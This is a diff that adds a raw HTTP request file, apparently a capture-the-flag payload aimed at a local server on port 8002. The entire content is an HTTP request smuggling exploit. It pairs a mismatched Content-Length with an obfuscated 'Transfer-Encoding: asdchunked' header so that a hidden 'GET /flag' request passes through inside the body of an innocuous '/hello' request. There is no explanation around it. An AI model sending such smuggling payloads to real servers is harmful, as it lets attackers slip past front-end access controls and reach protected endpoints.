@@ -1,0 +1,14 @@
+GET /hello HTTP/1.1
+Host: 0.0.0.0:8002
+Content-Length: 4
+Transfer-Encoding: asdchunked
+
+2a
+GET /flag HTTP/1.1
+Host: 0.0.0.0:8002
+
+
+0
+
+GET /hello HTTP/1.1
+Host: 0.0.0.0:8002
